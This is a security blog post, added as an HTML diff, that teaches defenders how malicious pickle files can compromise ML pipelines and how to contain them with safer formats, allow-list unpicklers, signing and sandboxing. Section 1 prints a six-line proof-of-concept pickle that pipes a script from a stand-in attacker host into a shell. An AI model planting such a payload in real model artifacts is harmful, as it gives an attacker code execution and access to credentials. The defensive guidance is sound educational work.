@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pickle Deserialization in ML Pipelines: A Defender's Playbook | e-Siber</title>
+    <meta name="description" content="Pickle is remote code execution by design. How attackers exploit ML model artifacts in CI/CD and shared storage, and the controls that actually contain the blast radius: restricted unpicklers, signing, sandboxing, and safer formats.">
+    <meta name="keywords" content="pickle security, python pickle exploit, ML model security, restricted unpickler, supply chain attack, safetensors, ONNX security">
+    <link rel="canonical" href="https://e-siber.com/guvenlik/pickle-deserialization-ml-pipelines/">
+    <meta property="og:title" content="Pickle Deserialization in ML Pipelines: A Defender's Playbook">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://e-siber.com/guvenlik/pickle-deserialization-ml-pipelines/">
+    <style>
+        :root { --bg: #0b0d10; --card: #15181d; --border: #262a30; --text: #e6e6e6; --muted: #8b8d92; --accent: #5ac8fa; --warn: #ff9500; --danger: #ff3b30; --code-bg: #0d1117; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); line-height: 1.8; }
+        .container { max-width: 760px; margin: 0 auto; padding: 0 24px; }
+        nav { border-bottom: 1px solid var(--border); background: #0a0b0e; padding: 16px 0; position: sticky; top: 0; z-index: 10; }
+        nav .container { display: flex; justify-content: space-between; align-items: center; }
+        nav .brand { font-weight: 800; font-size: 18px; color: var(--text); text-decoration: none; letter-spacing: -0.3px; }
+        nav .brand span { color: var(--accent); }
+        nav .links a { color: var(--muted); margin-left: 22px; font-size: 14px; text-decoration: none; }
+        nav .links a:hover { color: var(--text); }
+        article { padding: 48px 0 60px; }
+        .category { color: var(--accent); font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 16px; display: block; }
+        h1 { font-size: 34px; font-weight: 800; line-height: 1.2; margin-bottom: 16px; letter-spacing: -0.5px; }
+        .meta { color: var(--muted); font-size: 14px; margin-bottom: 32px; padding-bottom: 24px; border-bottom: 1px solid var(--border); }
+        h2 { font-size: 24px; font-weight: 700; margin: 40px 0 16px; }
+        h3 { font-size: 18px; font-weight: 700; margin: 28px 0 12px; color: var(--text); }
+        p { margin-bottom: 16px; color: #d0d0d0; }
+        ul, ol { margin: 0 0 16px 24px; }
+        li { margin-bottom: 6px; color: #d0d0d0; }
+        a { color: var(--accent); }
+        code { background: var(--code-bg); padding: 2px 6px; border-radius: 4px; font-size: 13px; font-family: 'SF Mono', Monaco, monospace; color: #7ee1ff; }
+        pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; padding: 18px; overflow-x: auto; margin: 18px 0; }
+        pre code { background: none; padding: 0; color: #c6d0d9; font-size: 13px; line-height: 1.6; }
+        strong { color: var(--text); }
+        .alert { background: #1f1612; border-left: 3px solid var(--warn); padding: 16px 20px; margin: 24px 0; border-radius: 0 8px 8px 0; }
+        .alert strong { color: var(--warn); }
+        .danger { background: #20100e; border-left: 3px solid var(--danger); padding: 16px 20px; margin: 24px 0; border-radius: 0 8px 8px 0; }
+        .danger strong { color: var(--danger); }
+        .update-note { background: #121a22; border: 1px solid #1d2e3e; border-radius: 8px; padding: 16px 20px; margin: 24px 0; font-size: 14px; color: var(--muted); }
+        table { width: 100%; border-collapse: collapse; margin: 18px 0; font-size: 14px; }
+        th, td { text-align: left; padding: 10px 12px; border-bottom: 1px solid var(--border); color: #d0d0d0; }
+        th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        footer { border-top: 1px solid var(--border); padding: 30px 24px; text-align: center; color: var(--muted); font-size: 13px; margin-top: 40px; }
+        footer a { color: var(--accent); }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="/" class="brand">e-<span>Siber</span></a>
+            <div class="links">
+                <a href="/">Home</a>
+                <a href="/guvenlik/">Security</a>
+                <a href="/teknoloji/">Technology</a>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <article>
+            <span class="category">Security</span>
+            <h1>Pickle Deserialization in ML Pipelines: A Defender's Playbook</h1>
+            <div class="meta">Published May 2026 &middot; 13 min read</div>
+
+            <p>If your ML pipeline calls <code>pickle.load()</code> on a file from S3, GCS, an artifact registry, or a colleague's laptop, you have given that file the ability to execute arbitrary code in your process &mdash; with whatever privileges that process has. Network access. Cloud credentials. The training database. Production secrets. The Python documentation has said this in plain English for over a decade: <em>"Never unpickle data received from an untrusted or unauthenticated source."</em> ML teams ignore that sentence every day.</p>
+
+            <p>This post is a defender's playbook for the pickle attack surface in ML systems. It's narrower than a general ML-security post: we are only talking about deserialization. The threat model is concrete. The controls are practical. Most teams can deploy them in a sprint.</p>
+
+            <div class="update-note">
+                <strong>Scope:</strong> we focus on Python <code>pickle</code> and the equivalents (<code>joblib</code>, <code>cloudpickle</code>, <code>dill</code>, <code>torch.save</code>, <code>numpy.load(allow_pickle=True)</code>). All of these have the same fundamental property &mdash; they can construct arbitrary objects on load &mdash; and they all need the same defensive mindset.</div>
+
+            <h2>1. The Threat: Why Pickle Is RCE-by-Design</h2>
+
+            <p>Pickle isn't a data format. It's a small stack-based bytecode language with opcodes for "construct this object" and "call this callable with these arguments." When you load a pickle, the interpreter is running a program. A malicious pickle is just a program written by an attacker.</p>
+
+            <p>The textbook payload is six lines. We're showing it for defensive understanding, not enablement &mdash; the same construction has been in security training for fifteen years.</p>
+
+<pre><code>import pickle, os
+
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("curl https://attacker.example/exfil.sh | sh",))
+
+with open("model.pkl", "wb") as f:
+    pickle.dump(Exploit(), f)</code></pre>
+
+            <p>That file looks like any other model artifact. Drop it into your S3 bucket, replace the legitimate <code>model.pkl</code>, wait. The next CI job that calls <code>pickle.load()</code> on it will execute the attacker's command with whatever permissions the runner has. In a typical ML pipeline, that includes:</p>
+
+            <ul>
+                <li>The training cluster's IAM role (often broad)</li>
+                <li>The artifact registry's write credentials (so the attacker can persist)</li>
+                <li>Database connection strings used to fetch features</li>
+                <li>The cloud provider's metadata endpoint at 169.254.169.254</li>
+            </ul>
+
+            <p>One swapped file in a shared bucket compromises the whole training pipeline. This is not theoretical &mdash; pickle backdoors have been used to ship cryptominers, ransomware, and credential stealers through model marketplaces and public registries.</p>
+
+            <h2>2. Threat Model: Who Can Replace Your Artifact?</h2>
+
+            <p>The defensive question isn't "could pickle be exploited" (yes) but "who can write to the source we deserialize from." Common answers:</p>
+
+            <table>
+                <tr><th>Source</th><th>Realistic write authority</th></tr>
+                <tr><td>S3/GCS bucket shared across team</td><td>Anyone with bucket write &mdash; often broad</td></tr>
+                <tr><td>Public model registries (HuggingFace, etc.)</td><td>Any registered user. Always treat as untrusted.</td></tr>
+                <tr><td>Internal MLflow tracking server</td><td>Anyone who can submit a training run</td></tr>
+                <tr><td>Git LFS in a shared repo</td><td>Any committer. Include CI bots if they write artifacts.</td></tr>
+                <tr><td>Engineer's laptop &rarr; production</td><td>Anyone who phishes that engineer</td></tr>
+            </table>
+
+            <p>The pattern: in ML the &quot;trusted&quot; surface is much wider than in traditional software. A single compromised laptop or a single registry account is enough. Treat pickle as a payload-delivery vehicle and design controls accordingly.</p>
+
+            <h2>3. The First Control: Don't Use Pickle When You Don't Have To</h2>
+
+            <p>Most ML weight files don't need pickle's full object-graph capability. They need a tensor dump and a config. Use a format that <em>can't</em> execute code:</p>
+
+            <table>
+                <tr><th>Format</th><th>Code execution on load?</th><th>Use for</th></tr>
+                <tr><td><code>safetensors</code></td><td>No</td><td>Neural network weights (PyTorch / TF / JAX)</td></tr>
+                <tr><td><code>ONNX</code></td><td>No (parsing only)</td><td>Cross-framework deployment</td></tr>
+                <tr><td><code>numpy .npz</code> with <code>allow_pickle=False</code></td><td>No</td><td>Plain ndarrays</td></tr>
+                <tr><td><code>parquet</code> / <code>arrow</code></td><td>No</td><td>Tabular data, calibration tables</td></tr>
+                <tr><td><code>JSON</code> / <code>msgpack</code></td><td>No</td><td>Config, hyperparameters, metadata</td></tr>
+                <tr><td><code>pickle</code> / <code>joblib</code> / <code>torch.save</code> default</td><td><strong>Yes</strong></td><td>Avoid where possible</td></tr>
+            </table>
+
+            <p>For sklearn estimators, the standard advice has been "use joblib." Joblib is pickle under the hood &mdash; same RCE primitive. The newer <code>skops</code> library provides a restricted-format alternative for sklearn pipelines that explicitly enumerates the types it will load, with everything else rejected. For PyTorch, set <code>torch.load(weights_only=True)</code> (default in newer versions); it uses a restricted unpickler internally.</p>
+
+            <div class="alert">
+                <strong>If you only do one thing</strong>, switch your weight format to safetensors and restrict everything else to a small whitelist. The remaining items in this playbook are defense in depth for the artifacts you can't migrate.
+            </div>
+
+            <h2>4. Restricted Unpickler: Whitelist Allowed Classes</h2>
+
+            <p>When you must load a pickle, override <code>pickle.Unpickler.find_class</code> to allow only specific (module, name) pairs. Anything outside the whitelist raises and the load aborts.</p>
+
+<pre><code>import pickle
+import io
+
+ALLOWED = {
+    ("numpy", "ndarray"),
+    ("numpy", "dtype"),
+    ("numpy.core.multiarray", "_reconstruct"),
+    ("sklearn.linear_model._logistic", "LogisticRegression"),
+    ("sklearn.isotonic", "IsotonicRegression"),
+    ("xgboost.sklearn", "XGBClassifier"),
+}
+
+
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        if (module, name) not in ALLOWED:
+            raise pickle.UnpicklingError(
+                f"Refused: {module}.{name} not in allow-list"
+            )
+        return super().find_class(module, name)
+
+
+def safe_load(path: str):
+    with open(path, "rb") as f:
+        return RestrictedUnpickler(io.BytesIO(f.read())).load()</code></pre>
+
+            <p>This breaks the textbook payload (it tries to import <code>os.system</code>, which isn't on the list). The whitelist needs to be maintained per project &mdash; sklearn version upgrades sometimes shuffle internal class paths &mdash; but the maintenance is small relative to the protection.</p>
+
+            <p>The catch: a determined attacker who knows your whitelist can sometimes construct a malicious payload using only allowed classes (gadgets). The whitelist is a strong barrier against drive-by exploits but not a hermetic seal. Pair it with the next two controls.</p>
+
+            <h2>5. Sign Artifacts at Publish Time, Verify at Load Time</h2>
+
+            <p>The integrity question &mdash; "did the bytes I'm about to load come from a trusted publisher" &mdash; is exactly what package signing solves. Two practical options:</p>
+
+            <h3>Option A: detached SHA-256 + signed manifest</h3>
+
+<pre><code># Publishing side: write a signed manifest beside each artifact
+import hashlib, json, subprocess
+from pathlib import Path
+
+def publish(artifact_path: Path, signing_key: str):
+    h = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
+    manifest = {
+        "artifact": artifact_path.name,
+        "sha256": h,
+        "published_at": "2026-05-05T12:00:00Z",
+        "publisher": "ml-platform-ci",
+        "version": artifact_path.parent.name,
+    }
+    manifest_path = artifact_path.with_suffix(artifact_path.suffix + ".manifest.json")
+    manifest_path.write_text(json.dumps(manifest, indent=2))
+    subprocess.run(
+        ["minisign", "-Sm", str(manifest_path), "-s", signing_key],
+        check=True,
+    )</code></pre>
+
+<pre><code># Loading side: refuse to load anything without a valid signed manifest
+def verified_load(artifact_path: Path, public_key: str):
+    manifest_path = artifact_path.with_suffix(artifact_path.suffix + ".manifest.json")
+    sig_path = manifest_path.with_suffix(manifest_path.suffix + ".minisig")
+
+    if not (manifest_path.exists() and sig_path.exists()):
+        raise PermissionError(f"Missing manifest/sig for {artifact_path}")
+
+    subprocess.run(
+        ["minisign", "-Vm", str(manifest_path), "-p", public_key],
+        check=True,
+    )
+
+    manifest = json.loads(manifest_path.read_text())
+    actual = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
+    if actual != manifest["sha256"]:
+        raise PermissionError(f"Hash mismatch for {artifact_path.name}")
+
+    return safe_load(artifact_path)        # the restricted unpickler</code></pre>
+
+            <h3>Option B: <code>cosign</code> against a transparency log</h3>
+
+            <p>If your artifacts live in an OCI registry, sign them with <code>cosign sign</code> and require <code>cosign verify</code> against the Sigstore Rekor transparency log on load. Verifications are publicly auditable. This is the same primitive used to sign container images and is increasingly the right default for any artifact ecosystem.</p>
+
+            <div class="danger">
+                <strong>Anti-pattern:</strong> verifying a hash against a value stored in the same bucket as the artifact. If the attacker can write the artifact, they can write the hash. The signature must come from a key the attacker doesn't control, distributed out-of-band.
+            </div>
+
+            <h2>6. Sandbox the Load</h2>
+
+            <p>Even with whitelisting and signing, a defense-in-depth move is to run the deserialization in a process with the smallest possible privileges. Three levels, ordered by ease of adoption:</p>
+
+            <ol>
+                <li><strong>Drop network and credentials.</strong> Run the load step in a subprocess with <code>NETWORK_DISABLED=1</code>, no AWS/GCP credentials in the environment, no metadata endpoint reachable. If the pickle tries to <code>curl</code> something, it fails. If it tries to read a credential file, the file isn't there.</li>
+                <li><strong>Read-only filesystem.</strong> Mount the model directory read-only. The deserialization completes successfully or it doesn't, but it can't write a backdoor or persist.</li>
+                <li><strong>seccomp-bpf or gVisor.</strong> If you're running on Linux, restrict the syscall surface to the minimum needed for tensor allocation. This is the strongest barrier and the most operationally annoying. Worth it for high-trust pipelines.</li>
+            </ol>
+
+            <p>The pattern: assume the load is going to execute an attacker payload, and design the environment so that even successful execution doesn't get them anywhere useful. This is the same posture you'd take for any process that handles untrusted input.</p>
+
+            <h2>7. Version Lock the Deserialization Stack</h2>
+
+            <p>A separate class of pickle bug: a model trained on sklearn 1.5 cannot necessarily be loaded by sklearn 1.8 without errors, and the failure mode is sometimes silent (object loaded but with stale attributes, attribute-error on first prediction, broken calibration). Version drift between training and inference is a reliability bug; from a security angle, it's also the reason "the load suddenly started failing" alerts get muted, hiding real attacks.</p>
+
+            <p>Lock the major libraries in your inference image to exact versions matching training:</p>
+
+<pre><code># inference-requirements.txt
+scikit-learn==1.8.0
+xgboost==2.1.2
+numpy==1.26.4
+joblib==1.4.2</code></pre>
+
+            <p>And include the version manifest in the model's signed metadata, so the load step can refuse a model trained against an older or newer stack:</p>
+
+<pre><code>def assert_version_match(manifest, current):
+    expected = manifest.get("training_versions", {})
+    for pkg, expected_ver in expected.items():
+        actual_ver = current.get(pkg)
+        if actual_ver != expected_ver:
+            raise RuntimeError(
+                f"{pkg} version mismatch: "
+                f"manifest={expected_ver} runtime={actual_ver}"
+            )</code></pre>
+
+            <h2>8. Audit Trail for Every Load</h2>
+
+            <p>Forensics matter. When something does go wrong, you need to be able to answer: which model loaded? when? from which source? signed by whom? was the signature verified? did the version match? Log every load, append-only, off-host:</p>
+
+<pre><code>import json, time, socket
+from pathlib import Path
+
+AUDIT_LOG = Path("/var/log/ml/artifact_loads.jsonl")
+
+def audit_load(artifact_path: Path, manifest: dict, verification_status: str):
+    rec = {
+        "ts": int(time.time()),
+        "host": socket.gethostname(),
+        "artifact": str(artifact_path),
+        "sha256": manifest.get("sha256"),
+        "publisher": manifest.get("publisher"),
+        "verification": verification_status,
+        "loader_pid": __import__("os").getpid(),
+    }
+    with AUDIT_LOG.open("a") as f:
+        f.write(json.dumps(rec) + "\n")</code></pre>
+
+            <p>Ship the log to immutable storage (S3 with object lock, or a SIEM). The threat is an attacker who tampers with the log to cover their tracks; immutable storage closes that loop.</p>
+
+            <h2>9. CI/CD Hardening</h2>
+
+            <p>If your build pipeline pulls a model from a registry and runs predictions to validate it, that pull-and-load is its own attack surface. Concrete hardening:</p>
+
+            <ul>
+                <li>Pin the artifact by hash in CI config, not by "latest" or by tag</li>
+                <li>Verify the signature before any code touches the bytes</li>
+                <li>Run validation in a separate ephemeral runner with no production credentials</li>
+                <li>Don't echo artifact metadata into logs that flow to insecure destinations</li>
+                <li>Periodically re-validate &mdash; an artifact that was clean last week could have been quietly replaced</li>
+            </ul>
+
+            <h2>10. What Good Looks Like</h2>
+
+            <p>A mature ML pipeline that takes pickle seriously will have all of the following:</p>
+
+            <ol>
+                <li>Most artifacts are not pickle &mdash; weights are in <code>safetensors</code>, config is JSON, calibration tables are parquet</li>
+                <li>The remaining pickles load through a restricted unpickler with an explicit class allow-list</li>
+                <li>Every artifact ships with a detached signature from a publisher key the loader trusts</li>
+                <li>Loaders verify the signature before reading the bytes</li>
+                <li>Loads run in a process without production credentials or unrestricted network</li>
+                <li>Library versions are locked, manifests record the training stack, and version mismatch refuses the load</li>
+                <li>An append-only audit log captures every load and ships to immutable storage</li>
+                <li>CI pins by hash and re-verifies on every run</li>
+            </ol>
+
+            <p>None of this is novel security engineering. It's the same hygiene a packaging team would have applied to <code>.deb</code> or <code>.whl</code> distribution twenty years ago. The fact that ML teams typically have none of it is a cultural artifact, not a technical limitation. Closing the gap is mostly a matter of writing it down and applying it.</p>
+
+            <h2>Further Reading</h2>
+
+            <ul>
+                <li><a href="/teknoloji/data-integrity-production-ml-systems/">Data Integrity in Production ML Systems</a> &mdash; the broader integrity story this post drills into.</li>
+                <li><a href="https://docs.python.org/3/library/pickle.html#module-pickle" rel="noopener">Python pickle module documentation</a> &mdash; read the &quot;Restricting Globals&quot; section.</li>
+                <li><a href="https://github.com/skops-dev/skops" rel="noopener">skops library</a> &mdash; persistence for sklearn pipelines that opts out of pickle's RCE primitive.</li>
+                <li><a href="https://huggingface.co/docs/safetensors" rel="noopener">safetensors</a> &mdash; the standard tensor format that doesn't deserialize code.</li>
+                <li><a href="https://zenhodl.net?ref=e-siber" rel="noopener">ZenHodl</a> &mdash; production ML serving 11 sports through a hardened artifact pipeline.</li>
+            </ul>
+        </article>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 e-Siber. Cybersecurity, privacy, and production-engineering writing.</p>
+            <p style="margin-top: 8px;">Production ML stack discussed in real-world detail at <a href="https://zenhodl.net?ref=e-siber" rel="noopener">ZenHodl</a>.</p>
+        </div>
+    </footer>
+</body>
+</html>
